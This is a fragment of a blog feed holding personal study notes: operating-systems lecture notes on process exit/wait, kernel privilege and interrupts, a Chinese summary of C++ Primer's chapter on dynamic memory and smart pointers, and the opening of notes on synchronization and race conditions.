<li>As we discussed earlier a processes passes an <strong>exit code</strong> to the <code>exit()</code> function.</li>
<li>What happens to this exit code?</li>
</ul>
<h2 id="wait-The-Afterlife"><a href="#wait-The-Afterlife" class="headerlink" title="wait() # The Afterlife"></a><code>wait()</code> # The Afterlife</h2><ul>
<li>When a process calls <code>exit()</code> the kernel holds the exit code, which can be retrieved by the exiting child’s parent.</li>
<li>The parent retrieves this exit code by calling <code>wait()</code>, the last of the primary process-related system calls.<ul>
<li>And the one that stubbornly refuses to fit into my lifecycle metaphor.</li>
</ul>
</li>
</ul>
<h2 id="wait-exit"><a href="#wait-exit" class="headerlink" title="wait()/exit()"></a>wait()/exit()</h2><ul>
<li>We often consider <code>wait()</code> and <code>exit()</code> together, since they combine to remove any trace of a process from the system.</li>
<li>Until a process <em>both</em> calls <code>exit()</code> and has its exit code collected via <code>wait()</code> traces of it remain on the system:<ul>
<li>Its return code is retained by the kernel.</li>
<li>Its process ID (or PID) is also retained. Why?</li>
</ul>
</li>
<li>Processes that have <code>exit()</code>ed but not had their exit code collected are called <strong>zombies</strong>. (Ooh, scary!)</li>
<li><code>wait()</code>/<code>exit()</code> also present an interesting synchronization problem you will solve for ASST2.<ul>
<li>Calls to <code>wait()</code> (by the parent) and <code>exit()</code> (by the child) may interleave in the kernel.</li>
<li>You must guarantee that the parent can retrieve the exit code successfully.</li>
</ul>
</li>
</ul>
<h2 id="wait-exit-Issues"><a href="#wait-exit-Issues" class="headerlink" title="wait()/exit() Issues"></a><code>wait()</code>/<code>exit()</code> Issues</h2><ul>
<li>What happens if a process’s parent exits before it does?<ul>
<li>The “orphaned” process is assigned the init process as a parent, which  will collect its exit code when it exits. Referred to as reparenting.</li>
</ul>
</li>
<li>How do we prevent zombies from taking over the machine?<ul>
<li>A processes parent receives the SIGCHLD signal when a child calls exit(), alerting it to the chance to retrieve the child’s exit status.</li>
<li>On some systems a process can choose to have its children automatically reaped by ignoring this signal.</li>
<li>On bash the relevant command is the appropriately-named disown. This allows children to continue running as daemons even after bash exits.</li>
</ul>
</li>
</ul>
<h2 id="What-If-I-Don’t-Want-to-wait"><a href="#What-If-I-Don’t-Want-to-wait" class="headerlink" title="What If I Don’t Want to wait()?"></a>What If I Don’t Want to <code>wait()</code>?</h2><ul>
<li>Parent may want to peek at the exit status of its child, just to check on it. (Are you dead yet? Are you dead yet?)</li>
<li>Systems support a non-blocking <code>wait()</code> for this purpose:<ul>
<li><strong>Blocking</strong> <code>wait()</code> will block until the child exits, unless it has already exited in which case it returns immediately.</li>
<li><strong>Non-Blocking</strong> <code>wait()</code> will not block. Instead, its return status indicates if the child has exited and, if so, what the exit code was.</li>
</ul>
</li>
</ul>
<h2 id="Our-Simple-Shell-1"><a href="#Our-Simple-Shell-1" class="headerlink" title="Our Simple Shell"></a>Our Simple Shell</h2><ul>
<li>Disclaimer: this is C-like pseudo-code. It will not compile or run! (But it’s not far off.)</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  input = readLine();</span><br><span class="line">  returnCode = fork();</span><br><span class="line">  <span class="keyword">if</span> (returnCode == <span class="number">0</span>) &#123;</span><br><span class="line">    exec(input);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    wait(returnCode);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Aside-errno"><a href="#Aside-errno" class="headerlink" title="Aside: errno"></a>Aside: errno</h2><p>Where’s <code>exit()</code>?</p>
<ul>
<li>There is potential confusion between kernel system calls and wrappers implemented by <code>libc</code>:<ul>
<li><code>_exit()</code> (system call) v. <code>exit()</code> (C library function call).</li>
<li>The C library wraps system calls and changes their return codes.</li>
<li>The C library is what sets errno, not the kernel.</li>
</ul>
</li>
</ul>
<h2 id="Multiplexing-and-Abstracting-the-CPU"><a href="#Multiplexing-and-Abstracting-the-CPU" class="headerlink" title="Multiplexing and Abstracting the CPU"></a>Multiplexing and Abstracting the CPU</h2><p>For the next several weeks we’ll be looking at how the operating system manages the processor:</p>
<ul>
<li>What are the <strong>limitations or problems</strong> with the hardware resource that the operating system is trying to address? <em>There is only one (or at least, no that many) processor(s)</em>!</li>
<li>What are the <strong>mechanisms</strong> necessary to allow the processor to be shared? <em>Interrupts and context switching</em>.</li>
<li>What are the <strong>consequences</strong> for programmers of processor multiplexing? <em>Concurrency and synchronization</em>.</li>
<li>How do we design good <strong>policies</strong> ensuring that processor sharing meets the needs of the user? <em>Processor scheduling</em>.</li>
</ul>
<h2 id="Today-Operating-System-Privilege"><a href="#Today-Operating-System-Privilege" class="headerlink" title="Today: Operating System Privilege"></a>Today: Operating System Privilege</h2><ul>
<li>Earlier we alluded to the fact that the operating system is like a normal program with some special privileges.</li>
<li>In fact, implementing most of the process-related system calls we discussed last week <em>does not require these special privileges</em>!<ul>
<li>If you don’t believe me, look at user-space threading libraries. They provide functionality very similar to the <code>fork()</code>, <code>exec()</code>, <code>exit()</code> and <code>wait()</code> system calls we discussed.</li>
</ul>
</li>
<li>So <em>why does the operating system need special privileges</em>?</li>
</ul>
<h2 id="Multiplexing-Requires-Privilege"><a href="#Multiplexing-Requires-Privilege" class="headerlink" title="Multiplexing Requires Privilege"></a>Multiplexing Requires Privilege</h2><ul>
<li>In many cases implementing abstractions does not require special privileges.</li>
<li>However, the operating systems other task—multiplexing resources— <strong>does</strong>.</li>
<li>In order to divide resources between processes the system needs a trusted and privileged entity that can:<ul>
<li><strong>divide</strong> the resources, and</li>
<li><strong>enforce</strong> the division.</li>
</ul>
</li>
</ul>
<h2 id="No-Trusto-Processo"><a href="#No-Trusto-Processo" class="headerlink" title="No Trusto Processo"></a>No Trusto Processo</h2><ul>
<li>Why can’t processes share resources without a privileged arbiter?</li>
<li>Some processes are:<ul>
<li>malicious—“Hey, I’d like some more memory, so I’ll use yours!”</li>
<li>buggy—“Um, is this my memory or your memory? I’m not sure but I’ll just use it and hope things turn out OK…​”</li>
</ul>
</li>
</ul>
<h2 id="Privileged-Execution"><a href="#Privileged-Execution" class="headerlink" title="Privileged Execution"></a>Privileged Execution</h2><ul>
<li>CPUs implement a mechanism allowing the operating system to manage resources: <strong>kernel</strong> (or privileged) <strong>mode</strong>.</li>
<li>Being in kernel mode may mean that the executing code<ul>
<li>has access to <strong>special instructions</strong>, and</li>
<li>has a different <strong>view of memory</strong>.</li>
</ul>
</li>
</ul>
<h2 id="Special-Instructions"><a href="#Special-Instructions" class="headerlink" title="Special Instructions"></a>Special Instructions</h2><ul>
<li>When the CPU is in <strong>kernel mode</strong> there are special instructions that can be executed.<ul>
<li>These instructions usually modify important global state controlling how resources are shared.</li>
</ul>
</li>
<li>When the CPU is not in kernel mode it does not allow these instructions to be executed.<ul>
<li>We will see what happens when an unprivileged process tries to execute a privileged instruction in a minute.</li>
</ul>
</li>
</ul>
<h2 id="Protection-Boundaries"><a href="#Protection-Boundaries" class="headerlink" title="Protection Boundaries"></a>Protection Boundaries</h2><ul>
<li>The goal:<ul>
<li>only trusted kernel code runs in kernel mode;</li>
<li>untrusted user code always runs in user mode.</li>
</ul>
</li>
<li>The CPU implements mechanisms to transition between user and kernel mode which we will discuss during the rest of today’s class.</li>
</ul>
<h2 id="Aside-Fine-Grained-Protection"><a href="#Aside-Fine-Grained-Protection" class="headerlink" title="Aside: Fine-Grained Protection"></a>Aside: Fine-Grained Protection</h2><ul>
<li>Many modern CPUs implement <strong>more than two</strong> protection modes.</li>
<li>x86 processors actually have four protection “rings” from Ring 0 (most privileged) to Ring 3 (least privileged).</li>
<li>For many years operating systems running on x86 architectures only used Ring 0 (kernel mode) and Ring 3 (user mode).</li>
<li>Recently this has become more interesting because of operating system virtualization, so we will return to this.<ul>
<li>But for now, you can think of processors as having two privilege modes: kernel mode and user mode.</li>
</ul>
</li>
</ul>
<h2 id="Terminology"><a href="#Terminology" class="headerlink" title="Terminology"></a>Terminology</h2><ul>
<li><p>When we say “<em>application</em>“ we refer to code running without privileges or in unprivileged or “user” mode.</p>
</li>
<li><p>When we say “<em>kernel</em>“ we mean code running in privileged or kernel mode.</p>
</li>
<li><p>What makes the kernel special? <strong>It is the one application allowed to executed code in kernel mode!</strong></p>
</li>
</ul>
<h2 id="Bootstrapping-Privilege"><a href="#Bootstrapping-Privilege" class="headerlink" title="Bootstrapping Privilege"></a>Bootstrapping Privilege</h2><p>Why is the operating system allowed to run in kernel mode?</p>
<ul>
<li><strong>You installed your machine that way</strong>! This is what it means to install an operating system: choose a particular application to grant special privileges to.</li>
<li>On boot the CPU starts out executing the kernel code in privileged mode, which is how <strong>privilege is bootstrapped</strong>.</li>
<li>The kernel is responsible for lowering the privilege level before executing user code.</li>
</ul>
<h2 id="More-Terminology-Traps"><a href="#More-Terminology-Traps" class="headerlink" title="More Terminology: Traps"></a>More Terminology: Traps</h2><ul>
<li>When a normal application does something that causes the system to enter <strong>kernel mode</strong> we sometimes refer to this as trapping    into the kernel.</li>
<li>I frequently think about the thread that trapped into the kernel as <strong>running in the kernel</strong> after the trap occurs.<ul>
<li>On some level this is accurate: it is the same stream of instructions.</li>
<li>On some level this is not accurate: the kernel thread has its own stack and has saved the state of the trapping user thread, so in a way the user thread has been paused while the kernel performs some task on its behalf.</li>
</ul>
</li>
<li>Decide the way to think about this that is the most effective for you.</li>
</ul>
<h2 id="Privilege-Transitions"><a href="#Privilege-Transitions" class="headerlink" title="Privilege Transitions"></a>Privilege Transitions</h2><ul>
<li>The transition into the kernel or into privileged mode typically occurs for one of three reasons:<ul>
<li>a hardware device requests attention—<strong>hardware interrupt</strong></li>
<li>software requests attention—<strong>software interrupt</strong> or system call</li>
<li>software needs attention—<strong>software exception</strong></li>
</ul>
</li>
<li>What is the difference between <em>requesting</em> and <em>needing</em> attention?</li>
</ul>
<h2 id="Hardware-Interrupts"><a href="#Hardware-Interrupts" class="headerlink" title="Hardware Interrupts"></a>Hardware Interrupts</h2><ul>
<li>Hardware interrupts are used to signal that a particular device needs attention:<ul>
<li>a disk read completed, or</li>
<li>a network packet was received, or</li>
<li>a timer fired.</li>
</ul>
</li>
<li>Processors implement multiple <em>interrupt lines</em>, input wires on which a logic transition (or level) will trigger an interrupt.</li>
</ul>
<h2 id="Interrupt-Handling"><a href="#Interrupt-Handling" class="headerlink" title="Interrupt Handling"></a>Interrupt Handling</h2><p>When an interrupt is triggered (interrupt request, or IRQ), the processor:</p>
<ol>
<li><strong>enters privileged mode</strong>,</li>
<li><strong>records state</strong> necessary to process the interrupt,</li>
<li><strong>jumps to a pre-determined memory location</strong> and begins executing instructions.</li>
</ol>
<p>The instructions that the processor executes when an interrupt fires are called the <strong>interrupt service routine</strong> (ISR).</p>
]]></content>
      
        <categories>
            
            <category> OS </category>
            
            <category> CSE521 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[C++ Primer (12) - 动态内存]]></title>
      <url>/wiki/2017/07/30/C-C-Primer-12-%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98-C-Primer-12-%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98C-Primer-12-%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98/</url>
      <content type="html"><![CDATA[<p>C++ 支持动态分配对象。动态对象的正确释放是编程中及其容易出错的地方。</p>
<p>程序使用动态内存处于以下三种原因之一：</p>
<ul>
<li>程序不知道自己需要使用多少对象</li>
<li>程序不知道所需对象的准确类型</li>
<li>程序需要在多个对象间共享数据</li>
</ul>
<h2 id="12-1-动态内存智能指针"><a href="#12-1-动态内存智能指针" class="headerlink" title="12.1 动态内存智能指针"></a>12.1 动态内存智能指针</h2><p>动态内存的管理是通过new和delete来完成的：</p>
<ul>
<li>new：分配空间，并返回一个指向该对象的指针</li>
<li>delete：销毁对象，释放关联的内存</li>
</ul>
<p>动态内存的使用非常容易出现问题，C++标准库提供了<strong>智能指针</strong>(smart pointer)来管理动态对象(定义在memory头文件中)：</p>
<ul>
<li><code>shared_ptr</code>: 允许多个指针指向同一个对象</li>
<li><code>unique_ptr</code>: 独占所指向的对象</li>
<li><code>weak_ptr</code>: 指向<code>shared_ptr</code>所管理的对象的弱引用</li>
</ul>
<h3 id="12-1-1-shard-ptr类"><a href="#12-1-1-shard-ptr类" class="headerlink" title="12.1.1 shard_ptr类"></a>12.1.1 shard_ptr类</h3><p>默认初始化的智能指针中保存着一个空指针。shared_ptr支持的操作：</p>
<ul>
<li><code>shared_ptr&lt;T&gt; sp</code> 空智能指针，可以指向类型为T的对象</li>
<li><code>p</code>  将p用作一个条件判断，若p指向一个对象，则为true</li>
<li><code>*p</code> 解引用p，获得它指向的对象</li>
<li><code>p-&gt;mem</code> 等价于 (*p).mem</li>
<li><code>p.get()</code> 返回p中保存的指针。</li>
<li><code>swap(p, q), p.swap(q)</code> 交换p和q中的指针</li>
<li><code>make_shared&lt;T&gt;(args)</code> 返回一个shared_ptr, 指向一个动态分配的类型为T的对象。使用args初始化此对象</li>
<li><code>shared_ptr&lt;T&gt;p(q)</code> p是q的拷贝</li>
<li><code>p=q</code> p和q都是shared_ptr，所保存的指针必须能相互转换。此造作会递减p的引用计数，递增q的引用计数；若p的引用计数变为0，则将其管理的原内存释放</li>
</ul>
<p>每个shard_ptr都有一个引用计数，以下情况计数器会递增：</p>
<ul>
<li>拷贝一个shared_ptr</li>
<li>用一个shared_ptr初始化另一个shared_ptr(注：传值时拷贝)</li>
<li>把shared_ptr作为参数传递给一个函数</li>
<li>shared_ptr作为函数的返回值</li>
</ul>
<p>以下情况，引用计数递减</p>
<ul>
<li>给shared_ptr赋予一个新值</li>
<li>shared_ptr被销毁</li>
</ul>
<p>一旦一个shared_ptr引用计数为0，它就会自动释放自己所管理的对象。</p>
<h3 id="12-1-2-直接管理内存"><a href="#12-1-2-直接管理内存" class="headerlink" title="12.1.2  直接管理内存"></a>12.1.2  直接管理内存</h3><p>C++通过new和delete来直接管理内存。</p>
<p>传递给delete的指针必须指向动态分配的内存或者一个空指针。也就是说一般的指针是不可以的。</p>
<p>使用new和delete管理动态内存存在三个常见问题：</p>
<ul>
<li>内存泄漏(memory leak)：忘记delete内存</li>
<li>使用已经释放的对象</li>
<li>同一块内存释放两次</li>
</ul>
<p><strong>空悬指针</strong>(dangling pointer)：在delete之后，指针值变为无效，但指针仍然保存着已经释放了的动态内存的地址。可以在离开其作用于之前释放掉它所关联的内存，或者赋予nullptr值。</p>
<h2 id="12-1-3-shared-ptr和new结合使用"><a href="#12-1-3-shared-ptr和new结合使用" class="headerlink" title="12.1.3 shared_ptr和new结合使用"></a>12.1.3 shared_ptr和new结合使用</h2><p>接受指针参数的智能指针构造函数是explicit的，因此我们不能将一个内置指针隐式转换为一个智能指针，智能使用直接初始化形式来初始化一个智能指针：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; p1 = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">1024</span>); <span class="comment">// error</span></span><br><span class="line"><span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; p2(<span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">1024</span>); <span class="comment">//correct</span></span><br></pre></td></tr></table></figure>
<p>注：两种初始化</p>
<ul>
<li>拷贝初始化(copy initialization)： 使用=初始化一个变量</li>
<li>直接初始化(direct initialization)： 不使用=</li>
</ul>
<h3 id="12-1-5-unique-ptr"><a href="#12-1-5-unique-ptr" class="headerlink" title="12.1.5 unique_ptr"></a>12.1.5 unique_ptr</h3><p>一个unique_ptr”拥有”它所指向的对象。与shared_ptr不同，某个时刻只能有一个unique_ptr指向一个给定对象。当unique_ptr被销毁时，它所指向的对象也被销毁。</p>
<p>类似shared_ptr，初始化unique_ptr必须采用直接初始化形式：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unique_ptr</span>&lt;<span class="keyword">double</span>&gt; p1; <span class="comment">// 可以指向一个double的unique_ptr</span></span><br><span class="line"><span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>&gt; p2(<span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">42</span>)); <span class="comment">//指向一个值为42的int</span></span><br></pre></td></tr></table></figure>
<p>由于一个unique_ptr拥有它指向的对象，因此unique_ptr不支持普通的拷贝或赋值操作。</p>
<p>unique_ptr操作：</p>
<ul>
<li><code>unique_ptr&lt;T&gt; u1</code>: 空unique_ptr, 可以指向类型为T的对象。u1会使用delete来释放它的指针。</li>
<li><code>unique_ptr&lt;T, D&gt; u2</code>: u2会使用一个类型为D的可调用对象来释放它的指针。</li>
<li><code>unique_ptr&lt;T, D&gt; u(d)</code>: 空unique_ptr，指向类型为T的对象，用类型为D的对象d代替delete</li>
<li><code>u=nullptr</code>：释放u指向的对象，将u置为空</li>
<li><code>u.release()</code>: u放弃对指针的控制权，返回指针，并将u置为空</li>
<li><code>u.reset()</code>:释放u指向的对象</li>
<li><code>u.reset(q)，u.reset(nullptr)</code>: 如果提供了内置指针q，令u指向这个对象；否则将u置为空。</li>
</ul>
<p>release只是放弃了对指针的控制权，也就是切断unique_ptr和它原来管理的对象间的联系，并没有释放指向的内存。</p>
<h3 id="12-1-6-weak-ptr"><a href="#12-1-6-weak-ptr" class="headerlink" title="12.1.6 weak_ptr"></a>12.1.6 weak_ptr</h3><p>weak_ptr指向由一个shared_ptr管理的对象。将一个weak_ptr绑定到一个shared_ptr不会改变shared_ptr的引用计数。</p>
<p>weak_ptr操作：</p>
<ul>
<li><code>weak_ptr&lt;T&gt; w</code>： 空weak_ptr可以指向类型为T的对象</li>
<li><code>weak_ptr&lt;T&gt; w(sp)</code>：与shared_ptr sp指向相同对象的weak_ptr。T必须能转换为sp指向的类型</li>
<li><code>w=p</code>: p可以是一个shared_ptr或一个weak_ptr。赋值后w与p共享对象</li>
<li><code>w.reset()</code>：将w置为空</li>
<li><code>w.use_count()</code>:与w共享对象的shared_ptr的数量</li>
<li><code>w.expired()</code>:若w.use_count()为0，返回true，否则返回false</li>
<li><code>w.lock()</code>：如果expired为true，返回一个空的shared_ptr；否则返回一个指向w的对象的shared_ptr.</li>
</ul>
<p>weak_ptr主要用于解决上面提到的<strong>空悬指针</strong>(dangling pointer)问题。一般几乎不可能知道指针所指向的内存是否已经释放。通过shared_ptr的expired和lock操作，用户能够检查内存释放[1]。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// OLD, problem with dangling pointer</span></span><br><span class="line">    <span class="comment">// PROBLEM: ref will point to undefined data!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>* ptr = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">int</span>* ref = ptr;</span><br><span class="line">    <span class="keyword">delete</span> ptr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// NEW</span></span><br><span class="line">    <span class="comment">// SOLUTION: check expired() or lock() to determine if pointer is valid</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// empty definition</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;<span class="keyword">int</span>&gt; sptr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// takes ownership of pointer</span></span><br><span class="line">    sptr.reset(<span class="keyword">new</span> <span class="keyword">int</span>);</span><br><span class="line">    *sptr = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get pointer to data without taking ownership</span></span><br><span class="line">    <span class="built_in">std</span>::weak_ptr&lt;<span class="keyword">int</span>&gt; weak1 = sptr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deletes managed object, acquires new pointer</span></span><br><span class="line">    sptr.reset(<span class="keyword">new</span> <span class="keyword">int</span>);</span><br><span class="line">    *sptr = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get pointer to new data without taking ownership</span></span><br><span class="line">    <span class="built_in">std</span>::weak_ptr&lt;<span class="keyword">int</span>&gt; weak2 = sptr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// weak1 is expired!</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">auto</span> tmp = weak1.lock())</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *tmp &lt;&lt; <span class="string">'\n'</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"weak1 is expired\n"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// weak2 points to new data (5)</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">auto</span> tmp = weak2.lock())</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *tmp &lt;&lt; <span class="string">'\n'</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"weak2 is expired\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="12-2-动态数组"><a href="#12-2-动态数组" class="headerlink" title="12.2 动态数组"></a>12.2 动态数组</h2><h3 id="12-2-2-allocator类"><a href="#12-2-2-allocator类" class="headerlink" title="12.2.2 allocator类"></a>12.2.2 allocator类</h3><p>allocator是C++标准类库，用来分配未构造的内存。</p>
<p>allocator分配的内存是未构造的(unconstructed)。为了使用allocate返回的内存，必须用construct构造对象。使用未构造的内存，其行为是未定义的。</p>
<p>标准库allocator类及其算法：</p>
<ul>
<li><code>allocator&lt;T&gt; a</code>： 定义了一个名为a的allocator对象，它可以为类型为T的对象分配内存</li>
<li><code>a.allocate(n)</code>：分配一段原始的、未构造的内存，保存n个类型为T的对象</li>
<li><code>a.deallocate(p, n)</code>：释放从T*指针p中地址开始的内存，这块内存保存了n个类型为T的对象；p必须是一个先前由allocate返回的指针，且n必须是p创建时所要求的大小。在调用deallocate之前，用户必须对每个在这块内存中创建的对象调用destory。</li>
<li><code>a.construct(p, args)</code>: p必须是一个类型为T*的指针，指向一块原始内存；arg被传递给类型为T的构造函数，用来在p指向的内存中构造一个对象。</li>
<li><code>a.destroy(p)</code>: p为T*类型的指针，此算法对p指向的对象执行析构函数。</li>
</ul>
<p>除了construct，还可以用<code>uninitialized_copy</code>和<code>uninitialized__fill</code>在未初始化内存中创建对象。</p>
<p>copy与uninitialized_copy的不同见[2]。</p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol>
<li><a href="https://stackoverflow.com/questions/12030650/when-is-stdweak-ptr-useful">When is std:weak_ptr useful?</a></li>
<li><a href="https://stackoverflow.com/questions/30158192/difference-between-stduninitialized-copy-stdcopy">Difference between std::uninitialized_copy &amp; std::copy?</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> C++ </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Memory </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Introduction to Synchronization]]></title>
      <url>/wiki/2017/07/30/OS-CSE521-4-Introduction-to-Synchronation/</url>
      <content type="html"><![CDATA[<h2 id="Fast-Forward-Synchronization"><a href="#Fast-Forward-Synchronization" class="headerlink" title="Fast Forward: Synchronization"></a>Fast Forward: Synchronization</h2><p>What you need to know</p>
<ul>
<li><p>The OS creates the <em>illusion of concurrency</em> by quickly switching the processor(s) between multiple threads</p>
<ul>
<li>We will back up and discuss how this happens after discussion synchronization</li>
</ul>
</li>
<li><p><strong>Threads</strong> are used to abstract and multiplex the CPU</p>
</li>
</ul>
<h2 id="Pandora’s-Concurrency-Box"><a href="#Pandora’s-Concurrency-Box" class="headerlink" title="Pandora’s Concurrency Box"></a>Pandora’s Concurrency Box</h2><p>The illusion of concurrency is both <strong>powerful</strong> and <strong>useful</strong>:</p>
<ul>
<li>It helps us think about how to structure our applications.</li>
<li>It hides latencies caused by slow hardware devices.</li>
</ul>
<p>Unfortunately, concurrency also creates <strong>problems</strong>:</p>
<ul>
<li><strong>Coordination</strong>: how do we enable efficient communication between the multiple threads involved in performing a single task?</li>
<li><strong>Correctness</strong>: how do we ensure that shared state remains consistent when being accessed by multiple threads concurrently? How do we enforce time-based semantics?</li>
</ul>
<p>We will focus on <strong>correctness</strong> today but return to <strong>coordination</strong> later.</p>
<h2 id="Patient-0"><a href="#Patient-0" class="headerlink" title="Patient 0"></a>Patient 0</h2><p>The <strong>operating system</strong> itself is one of the most difficult concurrent programs to write. Why?</p>
<ul>
<li>It is multiplexing access to hardware resources and therefore sharing a great deal of state between multiple processes!</li>
<li>It frequently uses many threads to hide hardware delays while servicing devices and application requests.</li>
<li><strong>Lots of shared state</strong> plus <strong>lots of threads</strong> equals a difficult synchronization problem.</li>
<li>Also, if the operating system gets synchronization wrong <strong>bad things happen</strong>.</li>
</ul>
<h2 id="Concurrency-v-Parallelism"><a href="#Concurrency-v-Parallelism" class="headerlink" title="Concurrency v. Parallelism"></a>Concurrency v. Parallelism</h2><p>The Go developers have a great description of this distinction. According to them:</p>
<blockquote>
<p>…​when people hear the word concurrency they often think of<br>parallelism, a related but quite distinct concept. In programming,<br>concurrency is the composition of independently executing processes,<br>while parallelism is the simultaneous execution of (possibly related)<br>computations. Concurrency is about dealing with lots of things at<br>once. Parallelism is about doing lots of things at once.</p>
</blockquote>
<p><a href="https://vimeo.com/49718712">Watch the video</a> to find out more.</p>
<h2 id="Unless-Shown-Otherwise…​"><a href="#Unless-Shown-Otherwise…​" class="headerlink" title="Unless Shown Otherwise…​"></a>Unless Shown Otherwise…​</h2><p>Concurrency forces us to relax any assumptions that we may want to make about how any particular thread executes.</p>
<p>Unless explicitly synchronized, threads may:</p>
<ol>
<li>Be run in <strong>any order</strong>,</li>
<li>Be stopped and restarted at <strong>any time</strong>,</li>
<li>Remain stopped for <strong>arbitrary lengths of time</strong>.</li>
</ol>
<ul>
<li>Generally these are <strong>good things</strong> — the operating system is making choices about how to allocate resources.</li>
<li>When accessing shared data these are <strong>challenges</strong> that force us to program more carefully.</li>
</ul>
<h2 id="Race-Conditions"><a href="#Race-Conditions" class="headerlink" title="Race Conditions"></a>Race Conditions</h2><p>A <strong>race condition</strong> is “when the output of a process is unexpectedly dependent on timing or other events.”</p>
<p>Note that the definition of a race depends on what we <strong>expected</strong> to happen:</p>
<ul>
<li>We expected me to have $4,000 after both deposits. (Otherwise we are not observing the Law of the Conversation of Money, probably important to banks except during bailouts.)</li>
</ul>
<h2 id="Concurrency-v-Atomicity"><a href="#Concurrency-v-Atomicity" class="headerlink" title="Concurrency v. Atomicity"></a>Concurrency v. Atomicity</h2><p><strong>Concurrency</strong>: the illusion that multiple things are happening at once.</p>
<ul>
<li>Requires stopping or starting any thread at any time.</li>
</ul>
<p><strong>Atomicity</strong>: the illusion that a set of separate actions occurred <strong>all at once</strong>.</p>
<ul>
<li>Requires not stopping certain threads at certain times or not starting certain threads at certain times, i.e. providing some limited control to threads over their scheduling.</li>
</ul>
<h2 id="Critical-Sections"><a href="#Critical-Sections" class="headerlink" title="Critical Sections"></a>Critical Sections</h2><p>A <strong>critical section</strong>(临界区) contains a series of instructions that only one thread can be executing at any given time.</p>
<ul>
<li>This set (or sets) of instructions will look atomic with respect to <strong>other threads executing code within the critical section</strong>.</li>
</ul>
